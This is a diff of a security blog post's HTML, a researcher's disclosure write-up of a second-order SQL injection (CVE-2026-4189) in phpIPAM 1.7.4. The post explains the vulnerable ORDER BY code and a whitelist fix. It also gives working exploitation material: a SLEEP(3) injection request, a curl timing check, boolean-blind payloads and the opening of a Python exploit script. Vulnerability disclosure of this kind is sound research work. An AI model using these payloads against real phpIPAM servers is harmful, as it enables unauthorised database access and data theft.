@@ -1,420 +1,196 @@
-<!DOCTYPE html>
-<html lang="en-us">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>phpIPAM 1.7.4 - Second Order SQL Injection via subnetOrdering | incogbyte</title>
-  <meta name="description" content="Offensive Security">
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="/css/style.css">
-</head>
-<body>
-  <canvas id="matrix-bg"></canvas>
-  <div class="scanline"></div>
-
-  <header class="site-header">
-  <nav class="navbar">
-    <a href="/" class="logo">
-      <span class="logo-bracket">[</span>
-      <span class="logo-text">incogbyte</span>
-      <span class="logo-bracket">]</span>
-      <span class="cursor">_</span>
-    </a>
-    <button class="menu-toggle" aria-label="Toggle menu">
-      <span></span>
-      <span></span>
-      <span></span>
-    </button>
-    <ul class="nav-links">
-      
-      <li><a href="/" class="nav-link">Home</a></li>
-      
-      <li><a href="/posts/" class="nav-link">Posts</a></li>
-      
-      <li><a href="/cve/" class="nav-link">CVEs</a></li>
-      
-      <li><a href="/about/" class="nav-link">About</a></li>
-      
-    </ul>
-  </nav>
-</header>
-
-
-  <main class="container">
-    
-<article class="post-single">
-  <header class="post-header fade-in">
-    <h1 class="post-single-title">phpIPAM 1.7.4 - Second Order SQL Injection via subnetOrdering</h1>
-    
-    <div class="post-single-meta">
-      <time>March 17, 2026</time>
-      <span class="reading-time">7 min read</span>
-    </div>
-    
-    
-    <div class="post-tags">
-      
-      <span class="tag">writeup</span>
-      
-    </div>
-    
-  </header>
-
-  <div class="post-content fade-in">
-    <h1 id="second-order-sql-injection-in-phpipam-174-cve-2026-4189">Second Order SQL Injection in phpIPAM 1.7.4 (CVE-2026-4189)</h1>
-<p>Back in 2022, I found a <a href="/posts/2022-01-20-cve-2022-23046-phpipam/">SQL injection in phpIPAM 1.4.4</a> (CVE-2022-23046) via the BGP mapping search feature. That was a classic, direct SQL injection  user input went straight into a query. This time, I went back to phpIPAM and found something more interesting: a <strong>Second Order SQL Injection</strong> in version <strong>1.7.4</strong>, where the payload is stored first and executed later in a completely different context.</p>
-<h2 id="what-is-a-second-order-sql-injection">What is a Second Order SQL Injection?</h2>
-<p>Most SQL injections are &quot;first order&quot; the malicious input is sent and executed in the same request. A <strong>second order</strong> (or stored) SQL injection is different:</p>
-<ol>
-<li><strong>First step (storage):</strong> The attacker submits a payload that gets safely stored in the database (escaped for storage, but not validated for SQL keywords).</li>
-<li><strong>Second step (execution):</strong> Later, the application retrieves that stored value and uses it <strong>unsafely</strong> in a different SQL query  that's when the injection fires.</li>
-</ol>
-<p>This makes second order SQLi harder to detect because the injection point and the execution point are in completely different parts of the application.</p>
-<h2 id="the-vulnerable-flow">The Vulnerable Flow</h2>
-<h3 id="step-1-storing-the-payload">Step 1: Storing the Payload</h3>
-<p>When an administrator edits a Section in phpIPAM, they can set a <code>subnetOrdering</code> parameter that controls how subnets are sorted. This value is submitted via POST to:</p>
-<pre tabindex="0"><code>POST /app/admin/sections/edit-result.php
-</code></pre><p>The application processes this input in <code>class.Sections.php</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff79c6">public</span> <span style="color:#ff79c6">function</span> <span style="color:#50fa7b">modify_section</span> (<span style="color:#8be9fd;font-style:italic">$action</span>, <span style="color:#8be9fd;font-style:italic">$values</span>) {
-</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// Only strips HTML tags  does NOT prevent SQL injection!
-</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd;font-style:italic">$values</span> <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">$this</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">strip_input_tags</span> (<span style="color:#8be9fd;font-style:italic">$values</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span>(<span style="color:#8be9fd;font-style:italic">$action</span><span style="color:#ff79c6">==</span><span style="color:#f1fa8c">&#34;edit&#34;</span>) {
-</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#8be9fd;font-style:italic">$this</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">section_edit</span> (<span style="color:#8be9fd;font-style:italic">$values</span>);
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>The <code>strip_input_tags()</code> function only calls <code>strip_tags()</code>, which removes HTML tags but has absolutely no effect on SQL payloads. The value is then stored in the database via PDO prepared statements (so the storage itself is safe):</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ff79c6">UPDATE</span> sections <span style="color:#ff79c6">SET</span> subnetOrdering <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;SLEEP(3)&#39;</span> <span style="color:#ff79c6">WHERE</span> id <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1</span>;
-</span></span></code></pre></div><p>At this point, the payload is sitting harmlessly in the <code>sections</code> table.</p>
-<h3 id="step-2-triggering-the-injection">Step 2: Triggering the Injection</h3>
-<p>When <strong>any user</strong> views the subnets page for that section, the application calls <code>fetch_section_subnets()</code> in <code>class.Subnets.php</code> (line 525):</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff79c6">public</span> <span style="color:#ff79c6">function</span> <span style="color:#50fa7b">fetch_section_subnets</span> (<span style="color:#8be9fd;font-style:italic">$sectionId</span>, <span style="color:#ff79c6">...</span>) {
-</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// ...
-</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#6272a4">// Retrieves the stored section from database
-</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd;font-style:italic">$section</span> <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">$this</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">fetch_object</span>(<span style="color:#f1fa8c">&#34;sections&#34;</span>, <span style="color:#f1fa8c">&#34;id&#34;</span>, <span style="color:#8be9fd;font-style:italic">$sectionId</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// Reads the attacker-controlled subnetOrdering value
-</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">if</span>(<span style="color:#ff79c6">@</span><span style="color:#8be9fd;font-style:italic">$section</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">subnetOrdering</span> <span style="color:#ff79c6">!=</span> <span style="color:#f1fa8c">&#34;default&#34;</span>
-</span></span><span style="display:flex;"><span>       <span style="color:#ff79c6">&amp;&amp;</span> <span style="color:#ff79c6">!</span>is_blank(<span style="color:#ff79c6">@</span><span style="color:#8be9fd;font-style:italic">$section</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">subnetOrdering</span>)) {
-</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">$order</span> <span style="color:#ff79c6">=</span> pf_explode(<span style="color:#f1fa8c">&#39;,&#39;</span>, <span style="color:#8be9fd;font-style:italic">$section</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">subnetOrdering</span>);
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// ...
-</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
-</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// VULNERABLE: $order[0] is interpolated directly into the query!
-</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd;font-style:italic">$query</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;SELECT </span><span style="color:#f1fa8c">$safe_result_fields</span><span style="color:#f1fa8c"> FROM `subnets`
-</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">              WHERE `sectionId` = ? </span><span style="color:#f1fa8c">$field_query</span><span style="color:#f1fa8c">
-</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">              ORDER BY `isFolder` desc,
-</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">              CASE `isFolder`
-</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">                WHEN 1 THEN description
-</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">                ELSE </span><span style="color:#f1fa8c">$order[0]</span><span style="color:#f1fa8c">    -- INJECTION HERE!
-</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">              END </span><span style="color:#f1fa8c">$order[1]</span><span style="color:#f1fa8c">&#34;</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">$subnets</span> <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">$this</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">Database</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">getObjectsQuery</span>(<span style="color:#f1fa8c">&#39;subnets&#39;</span>, <span style="color:#8be9fd;font-style:italic">$query</span>, <span style="color:#ff79c6">array</span>(<span style="color:#8be9fd;font-style:italic">$sectionId</span>));
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>The value stored in <code>subnetOrdering</code> is split by comma and <strong>directly concatenated</strong> into the SQL query without any sanitization or whitelist validation. The <code>sectionId</code> uses a prepared statement parameter (<code>?</code>), but <code>$order[0]</code> is raw string interpolation  classic mistake.</p>
-<h3 id="why-cant-we-use-prepared-statements-here">Why can't we use prepared statements here?</h3>
-<p>This is a common pitfall. PDO prepared statements <strong>cannot parameterize</strong> column names or expressions in <code>ORDER BY</code> clauses:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#6272a4">-- This does NOT work with prepared statements:
-</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">ORDER</span> <span style="color:#ff79c6">BY</span> <span style="color:#ff79c6">?</span>    <span style="color:#6272a4">-- ❌ PDO treats this as a literal string, not a column
-</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
-</span></span><span style="display:flex;"><span><span style="color:#6272a4">-- You MUST interpolate:
-</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">ORDER</span> <span style="color:#ff79c6">BY</span> $<span style="color:#ff79c6">column</span>  <span style="color:#6272a4">-- ✅ Works, but vulnerable if $column is not validated
-</span></span></span></code></pre></div><p>The correct fix is a <strong>whitelist</strong> of allowed values, not parameterization.</p>
-<h2 id="exploitation">Exploitation</h2>
-<h3 id="confirming-the-vulnerability-time-based">Confirming the Vulnerability: Time-Based</h3>
-<p>The simplest confirmation is a <code>SLEEP()</code> payload. The <code>subnetOrdering</code> column is <code>VARCHAR(16)</code>, which limits us to 16 characters  but <code>SLEEP(3)</code> is only 8.</p>
-<p><strong>Step 1:</strong> Authenticate and get a CSRF token.</p>
-<p><strong>Step 2:</strong> Inject the payload:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#50fa7b">POST</span> /app/admin/sections/edit-result.php <span style="color:#ff79c6">HTTP</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">1.1</span>
-</span></span><span style="display:flex;"><span>Host<span style="color:#ff79c6">:</span> target
-</span></span><span style="display:flex;"><span>Cookie<span style="color:#ff79c6">:</span> phpipam=&lt;session&gt;
-</span></span><span style="display:flex;"><span>Content-Type<span style="color:#ff79c6">:</span> application/x-www-form-urlencoded
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>id=1&amp;action=edit&amp;name=Customers&amp;description=Test&amp;subnetOrdering=SLEEP(3)&amp;strictMode=1&amp;showSubnet=1&amp;showVLAN=1&amp;showVRF=1&amp;showSupernetOnly=0&amp;masterSection=0&amp;csrf_cookie=&lt;token&gt;
-</span></span></code></pre></div><p><strong>Step 3:</strong> Visit the section's subnet page and measure response time:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ <span style="color:#8be9fd;font-style:italic">time</span> curl <span style="color:#f1fa8c">&#39;http://target/index.php?page=subnets&amp;section=1&#39;</span> <span style="color:#f1fa8c">\
-</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"></span>  -H <span style="color:#f1fa8c">&#39;Cookie: phpipam=&lt;session&gt;&#39;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>real    0m12.037s   <span style="color:#6272a4"># SLEEP(3) × 4 rows = ~12 seconds</span>
-</span></span></code></pre></div><p>The <code>SLEEP(3)</code> executes inside a <code>CASE WHEN</code> expression for <strong>every row</strong> where <code>isFolder != 1</code>. With 4 subnet rows, we get a 12-second delay  SQL injection confirmed.</p>
-<h3 id="boolean-based-blind-positional-oracle">Boolean-Based Blind: Positional Oracle</h3>
-<p>Beyond time-based, we can use <strong>boolean-based blind</strong> extraction by observing the <strong>order of elements</strong> on the page. The idea is:</p>
-<ul>
-<li>Inject a comparison like <code>id&gt;0</code>  the ORDER BY evaluates to <code>1</code> (true) or <code>0</code> (false) per row, changing the sort order.</li>
-<li>Compare the page output against a known baseline.</li>
-</ul>
-<pre tabindex="0"><code>subnetOrdering=id&gt;0      → Baseline TRUE (4 chars)
+<!doctype html><html lang=en-us><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><title>phpIPAM 1.7.4 - Second Order SQL Injection via subnetOrdering | incogbyte</title>
+<meta name=description content="Offensive security researcher focused on vulnerability research, mobile security, application security, and reverse engineering."><meta name=author content="Rodolfo Tavares"><meta name=theme-color content="#0b0e13"><link rel=canonical href=https://incogbyte.github.io/posts/2026-03-17-phpipam-second-order-sqli/><meta property="og:title" content="phpIPAM 1.7.4 - Second Order SQL Injection via subnetOrdering | incogbyte"><meta property="og:description" content="Offensive security researcher focused on vulnerability research, mobile security, application security, and reverse engineering."><meta property="og:type" content="article"><meta property="og:url" content="https://incogbyte.github.io/posts/2026-03-17-phpipam-second-order-sqli/"><link rel=preconnect href=https://fonts.googleapis.com><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=IBM+Plex+Sans:wght@400;500;600&display=swap" rel=stylesheet><script src=/js/theme-init.js></script><link rel=stylesheet href=/css/style.css></head><body><a class=skip-link href=#main-content>Skip to content</a><div class=site-grid aria-hidden=true></div><header class=site-header><nav class=navbar aria-label="Main navigation"><a href=/ class=logo aria-label="Rodolfo Tavares, Home"><span class=logo-mark aria-hidden=true>~/</span>
+<span class=logo-lockup><span class=logo-text>incogbyte</span>
+<span class=logo-subtitle>offensive security research</span></span></a><ul class=nav-links id=site-navigation><li><a href=/posts/ class=nav-link>Writing</a></li><li><a href=/cve/ class=nav-link>CVEs</a></li><li><a href=/about/ class=nav-link>About</a></li></ul><div class=nav-actions><button class=theme-toggle type=button aria-label="Switch to light theme" title="Switch to light theme">
+<span class=theme-icon aria-hidden=true>☀</span>
+</button>
+<button class=menu-toggle type=button aria-label="Open navigation" aria-expanded=false aria-controls=site-navigation>
+<span></span>
+<span></span>
+<span></span></button></div></nav></header><main class=container id=main-content><article class=post-single><header class="post-header fade-in"><h1 class=post-single-title>phpIPAM 1.7.4 - Second Order SQL Injection via subnetOrdering</h1><div class=post-single-meta><time>March 17, 2026</time>
+<span class=reading-time>7 min read</span></div><div class=post-tags><span class=tag>writeup</span>
+<span class=tag>web</span>
+<span class=tag>sqli</span></div></header><div class="post-content fade-in"><h1 id=second-order-sql-injection-in-phpipam-174-cve-2026-4189>Second Order SQL Injection in phpIPAM 1.7.4 (CVE-2026-4189)</h1><p>Back in 2022, I found a <a href=/posts/2022-01-20-cve-2022-23046-phpipam/>SQL injection in phpIPAM 1.4.4</a> (CVE-2022-23046) via the BGP mapping search feature. That was a classic, direct SQL injection user input went straight into a query. This time, I went back to phpIPAM and found something more interesting: a <strong>Second Order SQL Injection</strong> in version <strong>1.7.4</strong>, where the payload is stored first and executed later in a completely different context.</p><h2 id=what-is-a-second-order-sql-injection>What is a Second Order SQL Injection?</h2><p>Most SQL injections are "first order" the malicious input is sent and executed in the same request. A <strong>second order</strong> (or stored) SQL injection is different:</p><ol><li><strong>First step (storage):</strong> The attacker submits a payload that gets safely stored in the database (escaped for storage, but not validated for SQL keywords).</li><li><strong>Second step (execution):</strong> Later, the application retrieves that stored value and uses it <strong>unsafely</strong> in a different SQL query that's when the injection fires.</li></ol><p>This makes second order SQLi harder to detect because the injection point and the execution point are in completely different parts of the application.</p><h2 id=the-vulnerable-flow>The Vulnerable Flow</h2><h3 id=step-1-storing-the-payload>Step 1: Storing the Payload</h3><p>When an administrator edits a Section in phpIPAM, they can set a <code>subnetOrdering</code> parameter that controls how subnets are sorted. This value is submitted via POST to:</p><pre tabindex=0><code>POST /app/admin/sections/edit-result.php
+</code></pre><p>The application processes this input in <code>class.Sections.php</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#ff79c6>public</span> <span style=color:#ff79c6>function</span> <span style=color:#50fa7b>modify_section</span> (<span style=color:#8be9fd;font-style:italic>$action</span>, <span style=color:#8be9fd;font-style:italic>$values</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#6272a4>// Only strips HTML tags  does NOT prevent SQL injection!
+</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>    <span style=color:#8be9fd;font-style:italic>$values</span> <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>$this</span><span style=color:#ff79c6>-&gt;</span><span style=color:#50fa7b>strip_input_tags</span> (<span style=color:#8be9fd;font-style:italic>$values</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>if</span>(<span style=color:#8be9fd;font-style:italic>$action</span><span style=color:#ff79c6>==</span><span style=color:#f1fa8c>&#34;edit&#34;</span>) {
+</span></span><span style=display:flex><span>        <span style=color:#ff79c6>return</span> <span style=color:#8be9fd;font-style:italic>$this</span><span style=color:#ff79c6>-&gt;</span><span style=color:#50fa7b>section_edit</span> (<span style=color:#8be9fd;font-style:italic>$values</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>The <code>strip_input_tags()</code> function only calls <code>strip_tags()</code>, which removes HTML tags but has absolutely no effect on SQL payloads. The value is then stored in the database via PDO prepared statements (so the storage itself is safe):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#ff79c6>UPDATE</span> sections <span style=color:#ff79c6>SET</span> subnetOrdering <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;SLEEP(3)&#39;</span> <span style=color:#ff79c6>WHERE</span> id <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>1</span>;
+</span></span></code></pre></div><p>At this point, the payload is sitting harmlessly in the <code>sections</code> table.</p><h3 id=step-2-triggering-the-injection>Step 2: Triggering the Injection</h3><p>When <strong>any user</strong> views the subnets page for that section, the application calls <code>fetch_section_subnets()</code> in <code>class.Subnets.php</code> (line 525):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#ff79c6>public</span> <span style=color:#ff79c6>function</span> <span style=color:#50fa7b>fetch_section_subnets</span> (<span style=color:#8be9fd;font-style:italic>$sectionId</span>, <span style=color:#ff79c6>...</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#6272a4>// ...
+</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>    <span style=color:#6272a4>// Retrieves the stored section from database
+</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>    <span style=color:#8be9fd;font-style:italic>$section</span> <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>$this</span><span style=color:#ff79c6>-&gt;</span><span style=color:#50fa7b>fetch_object</span>(<span style=color:#f1fa8c>&#34;sections&#34;</span>, <span style=color:#f1fa8c>&#34;id&#34;</span>, <span style=color:#8be9fd;font-style:italic>$sectionId</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#6272a4>// Reads the attacker-controlled subnetOrdering value
+</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>    <span style=color:#ff79c6>if</span>(<span style=color:#ff79c6>@</span><span style=color:#8be9fd;font-style:italic>$section</span><span style=color:#ff79c6>-&gt;</span><span style=color:#50fa7b>subnetOrdering</span> <span style=color:#ff79c6>!=</span> <span style=color:#f1fa8c>&#34;default&#34;</span>
+</span></span><span style=display:flex><span>       <span style=color:#ff79c6>&amp;&amp;</span> <span style=color:#ff79c6>!</span>is_blank(<span style=color:#ff79c6>@</span><span style=color:#8be9fd;font-style:italic>$section</span><span style=color:#ff79c6>-&gt;</span><span style=color:#50fa7b>subnetOrdering</span>)) {
+</span></span><span style=display:flex><span>        <span style=color:#8be9fd;font-style:italic>$order</span> <span style=color:#ff79c6>=</span> pf_explode(<span style=color:#f1fa8c>&#39;,&#39;</span>, <span style=color:#8be9fd;font-style:italic>$section</span><span style=color:#ff79c6>-&gt;</span><span style=color:#50fa7b>subnetOrdering</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#6272a4>// ...
+</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>
+</span></span><span style=display:flex><span>    <span style=color:#6272a4>// VULNERABLE: $order[0] is interpolated directly into the query!
+</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>    <span style=color:#8be9fd;font-style:italic>$query</span> <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;SELECT </span><span style=color:#f1fa8c>$safe_result_fields</span><span style=color:#f1fa8c> FROM `subnets`
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>              WHERE `sectionId` = ? </span><span style=color:#f1fa8c>$field_query</span><span style=color:#f1fa8c>
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>              ORDER BY `isFolder` desc,
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>              CASE `isFolder`
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>                WHEN 1 THEN description
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>                ELSE </span><span style=color:#f1fa8c>$order[0]</span><span style=color:#f1fa8c>    -- INJECTION HERE!
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>              END </span><span style=color:#f1fa8c>$order[1]</span><span style=color:#f1fa8c>&#34;</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>$subnets</span> <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>$this</span><span style=color:#ff79c6>-&gt;</span><span style=color:#50fa7b>Database</span><span style=color:#ff79c6>-&gt;</span><span style=color:#50fa7b>getObjectsQuery</span>(<span style=color:#f1fa8c>&#39;subnets&#39;</span>, <span style=color:#8be9fd;font-style:italic>$query</span>, <span style=color:#ff79c6>array</span>(<span style=color:#8be9fd;font-style:italic>$sectionId</span>));
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>The value stored in <code>subnetOrdering</code> is split by comma and <strong>directly concatenated</strong> into the SQL query without any sanitization or whitelist validation. The <code>sectionId</code> uses a prepared statement parameter (<code>?</code>), but <code>$order[0]</code> is raw string interpolation classic mistake.</p><h3 id=why-cant-we-use-prepared-statements-here>Why can't we use prepared statements here?</h3><p>This is a common pitfall. PDO prepared statements <strong>cannot parameterize</strong> column names or expressions in <code>ORDER BY</code> clauses:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#6272a4>-- This does NOT work with prepared statements:
+</span></span></span><span style=display:flex><span><span style=color:#6272a4></span><span style=color:#ff79c6>ORDER</span> <span style=color:#ff79c6>BY</span> <span style=color:#ff79c6>?</span>    <span style=color:#6272a4>-- ❌ PDO treats this as a literal string, not a column
+</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>
+</span></span><span style=display:flex><span><span style=color:#6272a4>-- You MUST interpolate:
+</span></span></span><span style=display:flex><span><span style=color:#6272a4></span><span style=color:#ff79c6>ORDER</span> <span style=color:#ff79c6>BY</span> $<span style=color:#ff79c6>column</span>  <span style=color:#6272a4>-- ✅ Works, but vulnerable if $column is not validated
+</span></span></span></code></pre></div><p>The correct fix is a <strong>whitelist</strong> of allowed values, not parameterization.</p><h2 id=exploitation>Exploitation</h2><h3 id=confirming-the-vulnerability-time-based>Confirming the Vulnerability: Time-Based</h3><p>The simplest confirmation is a <code>SLEEP()</code> payload. The <code>subnetOrdering</code> column is <code>VARCHAR(16)</code>, which limits us to 16 characters but <code>SLEEP(3)</code> is only 8.</p><p><strong>Step 1:</strong> Authenticate and get a CSRF token.</p><p><strong>Step 2:</strong> Inject the payload:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#50fa7b>POST</span> /app/admin/sections/edit-result.php <span style=color:#ff79c6>HTTP</span><span style=color:#ff79c6>/</span><span style=color:#bd93f9>1.1</span>
+</span></span><span style=display:flex><span>Host<span style=color:#ff79c6>:</span> target
+</span></span><span style=display:flex><span>Cookie<span style=color:#ff79c6>:</span> phpipam=&lt;session&gt;
+</span></span><span style=display:flex><span>Content-Type<span style=color:#ff79c6>:</span> application/x-www-form-urlencoded
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>id=1&amp;action=edit&amp;name=Customers&amp;description=Test&amp;subnetOrdering=SLEEP(3)&amp;strictMode=1&amp;showSubnet=1&amp;showVLAN=1&amp;showVRF=1&amp;showSupernetOnly=0&amp;masterSection=0&amp;csrf_cookie=&lt;token&gt;
+</span></span></code></pre></div><p><strong>Step 3:</strong> Visit the section's subnet page and measure response time:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ <span style=color:#8be9fd;font-style:italic>time</span> curl <span style=color:#f1fa8c>&#39;http://target/index.php?page=subnets&amp;section=1&#39;</span> <span style=color:#f1fa8c>\
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c></span>  -H <span style=color:#f1fa8c>&#39;Cookie: phpipam=&lt;session&gt;&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>real    0m12.037s   <span style=color:#6272a4># SLEEP(3) × 4 rows = ~12 seconds</span>
+</span></span></code></pre></div><p>The <code>SLEEP(3)</code> executes inside a <code>CASE WHEN</code> expression for <strong>every row</strong> where <code>isFolder != 1</code>. With 4 subnet rows, we get a 12-second delay SQL injection confirmed.</p><h3 id=boolean-based-blind-positional-oracle>Boolean-Based Blind: Positional Oracle</h3><p>Beyond time-based, we can use <strong>boolean-based blind</strong> extraction by observing the <strong>order of elements</strong> on the page. The idea is:</p><ul><li>Inject a comparison like <code>id>0</code> the ORDER BY evaluates to <code>1</code> (true) or <code>0</code> (false) per row, changing the sort order.</li><li>Compare the page output against a known baseline.</li></ul><pre tabindex=0><code>subnetOrdering=id&gt;0      → Baseline TRUE (4 chars)
 subnetOrdering=id&lt;0      → Baseline FALSE (4 chars)
 subnetOrdering=user()&gt;&#39;a&#39; → Is DB user &gt; &#39;a&#39;? Check sort order
-</code></pre><p>The exploit script automates this:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> requests
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> re
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> sys
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>TARGET <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;http://localhost&#34;</span>
-</span></span><span style="display:flex;"><span>USER <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;admin&#34;</span>
